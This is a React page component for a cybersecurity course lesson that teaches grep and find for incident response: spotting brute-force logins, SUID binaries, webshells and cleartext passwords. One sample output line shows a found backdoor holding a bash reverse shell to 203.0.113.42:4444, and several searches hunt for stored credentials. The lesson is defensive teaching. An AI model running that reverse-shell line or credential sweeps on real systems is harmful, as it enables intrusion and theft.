'use client';

import { useState } from 'react';
import Link from 'next/link';

export default function FindingFilesTextLesson() {
  const [completed, setCompleted] = useState(false);

  return (
    <div className="max-w-4xl mx-auto">
      <nav className="flex items-center gap-2 text-xs text-dark-500 mb-6">
        <Link href="/courses/complete-cybersecurity" className="hover:text-white">Course</Link>
        <span className="text-dark-700">/</span>
        <span className="text-dark-300">Finding Files & Searching Text</span>
      </nav>

      <div className="mb-10">
        <div className="flex items-center gap-3 mb-3">
          <span className="badge-intermediate">PRACTICAL</span>
          <span className="text-xs text-dark-500">Module 3 · Lesson 17</span>
        </div>
        <h1 className="text-3xl font-bold tracking-tight mb-3">Finding Files & Searching Text (grep, find, locate)</h1>
        <p className="text-dark-400 leading-relaxed">
          Searching is 50% of security work. Finding malware, searching logs for attack
          patterns, locating configuration files — <code className="text-cyber-400">grep</code> and
          <code className="text-cyber-400"> find</code> are your two most powerful weapons.
        </p>
        <div className="flex items-center gap-5 mt-4 text-xs text-dark-500">
          <span>🕐 25 minutes</span><span>⚡ +20 XP</span><span>💻 Practical</span><span>🧪 Has Lab</span>
        </div>
      </div>

      <div className="space-y-10">

        {/* grep */}
        <section>
          <h2 className="text-xl font-bold text-white mb-4 flex items-center gap-2">
            <span className="w-7 h-7 bg-emerald-500/10 rounded-lg flex items-center justify-center text-xs text-emerald-400 border border-emerald-500/20">1</span>
            grep — Search Inside Files
          </h2>
          <p className="text-dark-300 leading-relaxed mb-4">
            <code className="text-cyber-400">grep</code> searches for a pattern (text/word) inside files.
            It's like Ctrl+F but 1000x more powerful — works on millions of lines instantly.
          </p>

          <div className="space-y-4">
            <div className="command-block">
              <div className="command-header"><span className="text-[11px] text-dark-500 font-mono">Basic grep — search for text in a file</span></div>
              <div className="command-body">
                <div><span className="command-prompt">$ </span><span className="text-white">grep "Failed password" /var/log/auth.log</span></div>
                <div className="command-output">
{`Jan 15 09:58:01 srv sshd[4521]: Failed password for root from 203.0.113.42
Jan 15 09:58:03 srv sshd[4521]: Failed password for root from 203.0.113.42
Jan 15 09:58:05 srv sshd[4521]: Failed password for admin from 203.0.113.42`}
                </div>
              </div>
              <div className="command-explanation">
                <p className="font-sans">Shows every line in auth.log containing "Failed password". Instant brute-force detection!</p>
              </div>
            </div>

            <div className="command-block">
              <div className="command-header"><span className="text-[11px] text-dark-500 font-mono">grep flags that matter for security</span></div>
              <div className="command-body text-xs space-y-3">
                <div>
                  <p className="text-dark-500"># -i = case insensitive (find "error", "Error", "ERROR")</p>
                  <div><span className="command-prompt">$ </span><span className="text-white">grep -i "error" /var/log/syslog</span></div>
                </div>
                <div>
                  <p className="text-dark-500"># -r = recursive (search ALL files in a directory)</p>
                  <div><span className="command-prompt">$ </span><span className="text-white">grep -r "password" /etc/</span></div>
                  <div className="command-output">/etc/pam.d/common-password: password requisite...
/etc/login.defs: PASS_MAX_DAYS 99999</div>
                </div>
                <div>
                  <p className="text-dark-500"># -c = count matches (how many times does it appear?)</p>
                  <div><span className="command-prompt">$ </span><span className="text-white">grep -c "Failed password" /var/log/auth.log</span></div>
                  <div className="command-output">142</div>
                </div>
                <div>
                  <p className="text-dark-500"># -v = invert (show lines that DON'T match)</p>
                  <div><span className="command-prompt">$ </span><span className="text-white">grep -v "#" /etc/ssh/sshd_config</span></div>
                  <div className="command-output">Port 22
PermitRootLogin yes
PasswordAuthentication yes</div>
                </div>
                <div>
                  <p className="text-dark-500"># -n = show line numbers (for reporting)</p>
                  <div><span className="command-prompt">$ </span><span className="text-white">grep -n "PermitRootLogin" /etc/ssh/sshd_config</span></div>
                  <div className="command-output">32:PermitRootLogin yes</div>
                </div>
              </div>
              <div className="command-explanation">
                <p className="font-sans text-amber-300/80"><strong>🔒 Security scenarios:</strong></p>
                <ul className="mt-1 space-y-0.5">
                  <li>• <code>grep -r "password" /var/www/</code> → find hardcoded passwords in web app code</li>
                  <li>• <code>grep -c "Failed" auth.log</code> → 142 failed logins = brute force attack</li>
                  <li>• <code>grep -v "#" sshd_config</code> → show actual SSH settings (ignore comments)</li>
                </ul>
              </div>
            </div>

            <div className="command-block">
              <div className="command-header"><span className="text-[11px] text-dark-500 font-mono">grep with regex — advanced pattern matching</span></div>
              <div className="command-body text-xs space-y-3">
                <div>
                  <p className="text-dark-500"># Find IP addresses in a log file</p>
                  <div><span className="command-prompt">$ </span><span className="text-white">grep -oE "[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+" /var/log/auth.log | sort | uniq -c | sort -rn</span></div>
                  <div className="command-output">    142 203.0.113.42
     23 198.51.100.15
      5 10.0.0.1</div>
                </div>
                <div>
                  <p className="text-dark-500"># Find email addresses in files</p>
                  <div><span className="command-prompt">$ </span><span className="text-white">grep -roE "[a-zA-Z0-9.]+@[a-zA-Z0-9.]+" /var/www/</span></div>
                  <div className="command-output">/var/www/config.php:admin@company.com
/var/www/contact.html:support@company.com</div>
                </div>
              </div>
              <div className="command-explanation">
                <p className="font-sans"><strong>-o</strong> = only show the matching part, <strong>-E</strong> = extended regex. Combined with <code>sort | uniq -c | sort -rn</code> = count occurrences and rank by frequency. This is how you find the top attacking IPs!</p>
              </div>
            </div>
          </div>
        </section>

        {/* find */}
        <section>
          <h2 className="text-xl font-bold text-white mb-4 flex items-center gap-2">
            <span className="w-7 h-7 bg-emerald-500/10 rounded-lg flex items-center justify-center text-xs text-emerald-400 border border-emerald-500/20">2</span>
            find — Search for Files by Properties
          </h2>
          <p className="text-dark-300 leading-relaxed mb-4">
            While <code className="text-cyber-400">grep</code> searches INSIDE files,
            <code className="text-cyber-400"> find</code> searches FOR files based on name, size, date, permissions, owner, etc.
          </p>

          <div className="command-block">
            <div className="command-header"><span className="text-[11px] text-dark-500 font-mono">Security-critical find commands</span></div>
            <div className="command-body text-xs space-y-3">
              <div>
                <p className="text-dark-500"># Find files modified in last 24 hours (what changed recently?)</p>
                <div><span className="command-prompt">$ </span><span className="text-white">find / -mtime -1 -type f 2&gt;/dev/null | head -20</span></div>
                <div className="command-output">/var/log/auth.log
/var/log/syslog
/home/h4cker_user/.bash_history
/tmp/.hidden_miner</div>
              </div>
              <div>
                <p className="text-dark-500"># Find SUID binaries (privilege escalation check)</p>
                <div><span className="command-prompt">$ </span><span className="text-white">find / -perm -4000 -type f 2&gt;/dev/null</span></div>
                <div className="command-output">/usr/bin/passwd
/usr/bin/sudo
/usr/bin/find   ← ⚠️ DANGEROUS!</div>
              </div>
              <div>
                <p className="text-dark-500"># Find world-writable files (anyone can modify)</p>
                <div><span className="command-prompt">$ </span><span className="text-white">find / -perm -002 -type f 2&gt;/dev/null</span></div>
              </div>
              <div>
                <p className="text-dark-500"># Find files larger than 100MB (data exfiltration?)</p>
                <div><span className="command-prompt">$ </span><span className="text-white">find / -size +100M -type f 2&gt;/dev/null</span></div>
              </div>
              <div>
                <p className="text-dark-500"># Find files owned by a suspicious user</p>
                <div><span className="command-prompt">$ </span><span className="text-white">find / -user h4cker_user -type f 2&gt;/dev/null</span></div>
                <div className="command-output">/home/h4cker_user/.bashrc
/home/h4cker_user/.hidden_backdoor.sh
/tmp/.x11_session_miner</div>
              </div>
            </div>
            <div className="command-explanation">
              <p className="font-sans"><strong>2&gt;/dev/null</strong> hides "Permission denied" errors for directories you can't access.</p>
              <p className="mt-1 text-amber-300/80"><strong>🔒 Incident response workflow:</strong> 1) Find recently modified files → 2) Check SUID binaries → 3) Find files owned by suspect → 4) Check /tmp for malware</p>
            </div>
          </div>
        </section>

        {/* Combining */}
        <section>
          <h2 className="text-xl font-bold text-white mb-4 flex items-center gap-2">
            <span className="w-7 h-7 bg-cyber-400/10 rounded-lg flex items-center justify-center text-xs text-cyber-400 border border-cyber-400/20">3</span>
            Combining grep + find — Maximum Power
          </h2>

          <div className="command-block">
            <div className="command-header"><span className="text-[11px] text-dark-500 font-mono">Real investigation commands</span></div>
            <div className="command-body text-xs space-y-3">
              <div>
                <p className="text-dark-500"># Find all PHP files containing "exec(" (possible webshell)</p>
                <div><span className="command-prompt">$ </span><span className="text-white">find /var/www -name "*.php" -exec grep -l "exec(" {'{}'}  \;</span></div>
                <div className="command-output">/var/www/uploads/shell.php   ← 🚨 WEBSHELL FOUND!</div>
              </div>
              <div>
                <p className="text-dark-500"># Find all files containing an IP address (C2 server?)</p>
                <div><span className="command-prompt">$ </span><span className="text-white">grep -r "203.0.113.42" / 2&gt;/dev/null</span></div>
                <div className="command-output">/var/log/auth.log:...from 203.0.113.42...
/home/h4cker_user/.hidden_backdoor.sh:bash -i >& /dev/tcp/203.0.113.42/4444</div>
              </div>
              <div>
                <p className="text-dark-500"># Find config files with passwords in cleartext</p>
                <div><span className="command-prompt">$ </span><span className="text-white">find /etc /opt /var/www -name "*.conf" -o -name "*.cfg" -o -name "*.yml" | xargs grep -il "password"</span></div>
                <div className="command-output">/etc/mysql/debian.cnf
/var/www/app/config/database.yml
/opt/backup/config.conf</div>
              </div>
            </div>
            <div className="command-explanation">
              <p className="font-sans text-red-300"><strong>🚨 These are real techniques used in incident response every day.</strong> Finding webshells, C2 connections, and cleartext credentials are top-priority investigation tasks.</p>
            </div>
          </div>
        </section>

        {/* Quick Reference */}
        <section className="card-glass overflow-hidden p-0">
          <div className="px-4 py-3 border-b border-white/[0.06] bg-white/[0.02]">
            <h3 className="text-sm font-semibold text-white">Quick Reference — grep & find Cheat Sheet</h3>
          </div>
          <table className="w-full text-xs">
            <tbody className="divide-y divide-white/[0.04]">
              <tr><td className="px-4 py-2 text-cyber-400 font-mono w-1/2">grep "text" file</td><td className="px-4 py-2 text-dark-400">Search for text in file</td></tr>
              <tr><td className="px-4 py-2 text-cyber-400 font-mono">grep -r "text" /dir/</td><td className="px-4 py-2 text-dark-400">Search recursively in all files</td></tr>
              <tr><td className="px-4 py-2 text-cyber-400 font-mono">grep -i "text" file</td><td className="px-4 py-2 text-dark-400">Case-insensitive search</td></tr>
              <tr><td className="px-4 py-2 text-cyber-400 font-mono">grep -c "text" file</td><td className="px-4 py-2 text-dark-400">Count matching lines</td></tr>
              <tr><td className="px-4 py-2 text-cyber-400 font-mono">grep -v "text" file</td><td className="px-4 py-2 text-dark-400">Show lines NOT matching</td></tr>
              <tr><td className="px-4 py-2 text-cyber-400 font-mono">find / -name "*.log"</td><td className="px-4 py-2 text-dark-400">Find files by name</td></tr>
              <tr><td className="px-4 py-2 text-cyber-400 font-mono">find / -mtime -1</td><td className="px-4 py-2 text-dark-400">Modified in last day</td></tr>
              <tr><td className="px-4 py-2 text-cyber-400 font-mono">find / -perm -4000</td><td className="px-4 py-2 text-dark-400">SUID files (privesc check)</td></tr>
              <tr><td className="px-4 py-2 text-cyber-400 font-mono">find / -user bob</td><td className="px-4 py-2 text-dark-400">Files owned by user</td></tr>
              <tr><td className="px-4 py-2 text-cyber-400 font-mono">find / -size +100M</td><td className="px-4 py-2 text-dark-400">Files larger than 100MB</td></tr>
            </tbody>
          </table>
        </section>

        <section className="card-glass p-5">
          <h3 className="font-semibold text-white mb-3">✓ Key Takeaways</h3>
          <ul className="space-y-1.5 text-sm text-dark-300">
            <li>• <code>grep</code> = search INSIDE files for text patterns (logs, configs, code)</li>
            <li>• <code>find</code> = search FOR files by properties (name, date, permissions, owner, size)</li>
            <li>• Combine them for powerful forensics: find PHP files containing "exec("</li>
            <li>• <code>grep -r "password" /etc/</code> → find cleartext credentials in configs</li>
            <li>• <code>find / -perm -4000</code> → check for SUID privilege escalation vectors</li>
            <li>• <code>grep -c "Failed" auth.log</code> → quantify attack severity instantly</li>
          </ul>
        </section>

        <div className="flex items-center justify-between pt-4 border-t border-white/[0.04]">
          {completed ? (<span className="text-emerald-400 text-sm">✅ Completed! +20 XP</span>) : <div/>}
          <button onClick={() => setCompleted(true)} disabled={completed} className={completed ? 'btn-ghost text-emerald-400' : 'btn-primary'}>
            {completed ? '✓ Completed' : 'Mark as Complete'}
          </button>
        </div>
        <div className="flex items-center justify-between pt-4 border-t border-white/[0.04]">
          <Link href="/lessons/linux-users-groups" className="text-dark-500 hover:text-white transition-colors text-sm">← Previous: Users & Groups</Link>
          <Link href="/lessons/pipes-redirection-shell" className="text-cyber-400 hover:text-cyber-300 transition-colors text-sm font-medium">Next: Pipes, Redirection & Shell →</Link>
        </div>
      </div>
    </div>
  );
}
